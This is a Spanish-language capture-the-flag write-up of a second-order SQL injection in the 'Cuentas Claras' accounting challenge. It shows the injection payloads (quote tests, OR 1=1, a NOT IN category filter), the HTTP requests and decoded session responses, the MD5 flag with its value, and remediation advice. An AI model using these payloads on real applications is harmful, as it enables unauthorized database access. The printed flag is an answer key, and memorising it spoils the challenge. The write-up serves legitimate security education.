# Desafío - Cuentas Claras (HackLab)

**Plataforma:** HackLab (SoftwareSeguro)  
**Edición:** HackLab 2026  
**Categoría:** SQLi (Second-Order / Inyección en campo almacenado)  
**Autor:** adonaissh  

---

## 📌 Enunciado

> **Cuentas Claras** es una herramienta interna de contaduría para alta de proveedores y reportes de movimientos.
>
> Hay 20 categorías en el sistema, pero el selector de la interfaz solo permite elegir 17: existen **3 categorías restringidas** a las que no se puede dar de alta proveedores (no figuran en el selector ni el backend las acepta directamente). No obstante, esas 3 categorías poseen movimientos cargados.
>
> **Objetivo:** Averiguar cuántos movimientos hay en las 3 categorías restringidas, sumarlos, y calcular el hash MD5 de dicha suma para ingresarlo como flag en el juez.

---

## 🔍 Análisis Inicial y Reconocimiento

La aplicación web consta de un formulario para dar de alta proveedores (`POST /alta`) con los siguientes campos:
- **Nombre del proveedor**
- **Categoría** (selector con 17 opciones visibles)

Listado de las 17 categorías permitidas en el selector:
1. `Capacitacion`
2. `Catering`
3. `Consultoria`
4. `Insumos`
5. `Limpieza`
6. `Logistica`
7. `Mantenimiento`
8. `Marketing`
9. `Mobiliario`
10. `Papeleria`
11. `Seguridad`
12. `Servicios`
13. `Software`
14. `Tecnologia`
15. `Telefonia`
16. `Transporte`
17. `Viaticos`

En la tabla inferior se listan los proveedores creados. Cada fila cuenta con un botón **"Ver cantidad movimientos"**, el cual dispara una petición HTTP:

```http
POST /movimientos/<id>
```

El servidor responde con un redirect `302 FOUND` a `/` y almacena en la cookie de sesión (`session=...`) un mensaje flash codificado en base64:
- Decodificación base64 típica: `{"_flashes":[{" t":["ok","Proveedor #3: 1897 movimientos registrados."]}]}`.

---

## 🔬 Identificación de la Vulnerabilidad (SQLi de Segundo Orden)

### 1. Detección del punto de inyección

Al dar de alta un proveedor con una comilla simple en el nombre:
- **Nombre:** `Test'`
- **Categoría:** `Catering`

Al presionar "Ver cantidad movimientos" (`POST /movimientos/4`), el servidor retornó en la cookie de sesión el siguiente error:
```json
{"_flashes":[{" t":["error","No se pudo contar los movimientos para ese proveedor."]}]}
```
Esto demostró que el error ocurrió en la consulta de conteo interna provocada por la comilla sin escapar.

### 2. Confirmación con comentario SQL

Se probó cerrar la comilla y comentar el resto de la query:
- **Nombre:** `x' -- `
- Al consultar los movimientos (`POST /movimientos/5`), el servidor respondió:
```text
Proveedor #5: 0 movimientos registrados.
```
No hubo error sintáctico. La consulta fue válida pero buscó el proveedor literal `'x'`, confirmando que la consulta de conteo en `/movimientos/<id>` se arma mediante concatenación dinámica del nombre del proveedor recuperado de la base de datos (inyección SQL de segundo orden).

---

## 🚀 Explotación

### 1. Verificación de control total sobre el `WHERE`

Para verificar que la condición inyectada evaluaba la tabla completa de movimientos, se creó un proveedor forzando una condición booleana siempre verdadera:

- **Nombre:** `x' OR 1=1 -- `
- **Categoría:** `Catering`
- **Petición ejecutada:** `POST /movimientos/6`

**Respuesta decodificada de la cookie de sesión:**
```text
Proveedor #6: 51340 movimientos registrados.
```
Se obtuvieron exitosamente los 51.340 movimientos totales existentes en la base de datos.

### 2. Extracción directa de las 3 categorías restringidas

Dado que se conocían exactamente las 17 categorías visibles y el objetivo era contar los movimientos de las 3 categorías restantes no permitidas, se diseñó un payload utilizando el operador `NOT IN`:

- **Payload en Nombre del proveedor:**
  ```sql
  x' OR categoria NOT IN ('Capacitacion','Catering','Consultoria','Insumos','Limpieza','Logistica','Mantenimiento','Marketing','Mobiliario','Papeleria','Seguridad','Servicios','Software','Tecnologia','Telefonia','Transporte','Viaticos') -- 
  ```
- **Categoría elegida:** `Catering` (cualquiera del selector)

Se dio de alta el proveedor (generando el ID #7) y se ejecutó la consulta:

```http
POST /movimientos/7 HTTP/1.1
Host: chl-d0bc8860-208a-4b7a-b5ef-02748794ee76-cuentas-claras.b.softwareseguro.com.ar
```

**Respuesta del servidor:**
```http
HTTP/1.1 302 FOUND
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsib2siLCJQcm92ZWVkb3IgIzc6IDk3NjMgbW92aW1pZW50b3MgcmVnaXN0cmFkb3MuIl19XX0...
Location: /
```

Decodificando el contenido del flash en base64:
```text
Proveedor #7: 9763 movimientos registrados.
```

La suma exacta de movimientos registrados en las 3 categorías restringidas es **9763**.

### 3. Generación del Hash MD5

Calculando el hash MD5 de la suma obtenida (`9763`):

```python
import hashlib
print(hashlib.md5("9763".encode()).hexdigest())
# -> 0ffd15f002b98f6bd62346b947b8d15a
```

---

## 🏁 Flag

```text
0ffd15f002b98f6bd62346b947b8d15a
```

---

## 🛡️ Causa Raíz y Recomendaciones

- **Causa Raíz:** Inyección SQL de segundo orden (Second-Order SQL Injection). Si bien la inserción del proveedor en `/alta` se realizaba correctamente con sentencias preparadas, la lógica posterior en `/movimientos/<id>` recuperaba el campo `nombre` almacenado y lo concatenaba directamente dentro de una sentencia SQL de conteo (`SELECT COUNT(*) FROM movimientos WHERE proveedor = '{nombre}' ...`), permitiendo que el input previamente almacenado altere la lógica de la consulta.
- **Recomendaciones:**
  - **Consultas parametrizadas en todo el ciclo de vida:** Utilizar sentencias preparadas (Prepared Statements) con parámetros vinculados tanto en la escritura como en la lectura y conteo de datos.
  - **Relacionamiento por ID:** Vincular las tablas de `proveedores` y `movimientos` mediante claves foráneas numéricas (`proveedor_id`) en lugar de buscar por nombres en formato texto.
  - **Validación de entradas:** Implementar listas blancas en el backend para caracteres válidos en campos de texto (rechazando comillas o caracteres especiales de control SQL).
